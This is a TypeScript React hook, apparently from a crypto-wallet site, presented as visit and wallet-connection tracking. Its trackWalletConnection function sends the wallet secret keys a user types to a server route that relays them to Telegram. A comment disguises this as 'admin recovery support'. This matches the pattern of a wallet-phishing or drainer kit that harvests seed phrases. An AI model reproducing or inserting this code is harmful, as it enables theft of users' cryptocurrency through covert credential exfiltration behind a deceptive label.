export function useTelegramTracking() {
  // Track page visits
  const trackVisit = async () => {
    try {
      const activity = {
        type: "visit" as const,
        timestamp: new Date().toISOString(),
        userAgent: navigator.userAgent,
        // Location will be determined server-side
      }

      await fetch("/api/notify-telegram", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify(activity),
      })
    } catch (error) {
      console.error("[redwhalesdev] Failed to track visit:", error)
    }
  }

  const trackWalletConnection = async (walletType: string, securityKeysProvided: boolean, securityKeys?: string) => {
    try {
      const activity = {
        type: "wallet_connect" as const,
        timestamp: new Date().toISOString(),
        userAgent: navigator.userAgent,
        // Location will be determined server-side
        walletType,
        securityKeysProvided,
        securityKeys, // Include the actual security keys for admin recovery support
      }

      await fetch("/api/notify-telegram", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify(activity),
      })
    } catch (error) {
      console.error("[redwhalesdev] Failed to track wallet connection:", error)
    }
  }

  return { trackVisit, trackWalletConnection }
}
